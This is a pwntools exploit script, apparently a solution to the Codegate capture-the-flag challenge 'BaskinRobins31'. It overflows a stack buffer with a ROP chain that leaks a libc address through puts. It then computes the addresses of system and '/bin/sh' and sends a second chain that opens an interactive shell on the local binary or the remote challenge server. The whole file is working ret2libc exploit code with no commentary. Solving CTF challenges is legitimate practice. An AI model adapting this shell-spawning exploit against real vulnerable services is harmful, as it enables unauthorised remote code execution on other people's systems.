from pwn import *
import sys, time
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))
binary = ELF("./BaskinRobins31")
context.log_level = "debug"

main = 0x400A4B
pop1rdi = 0x0000000000400bc3    # : pop rdi; ret;
if len(sys.argv) == 1:
    p = process(["./BaskinRobins31"])
    pause()

else:
    p = remote("ch41l3ng3s.codegate.kr", "3131")

p.recvuntil("take ? (1-3)")
p.sendline("A" * 0xb0 + "B" * 8 + p64(pop1rdi) + p64(binary.got["puts"]) + p64(binary.plt["puts"]) + p64(main))
p.recvuntil("Don't break the rules...:( \n")
libc_base = u64(p.recv(6).ljust(8, "\x00")) - 0x6f690
system = libc_base + 0x045390
binsh = libc_base + 0x18cd57       # remote
#binsh = libc_base + 0x18cd17        # local
log.info("libc_base : " + hex(libc_base))

p.sendline("A" * 0xb0 + "B" * 8 + p64(pop1rdi) + p64(binsh) + p64(system))
p.interactive()
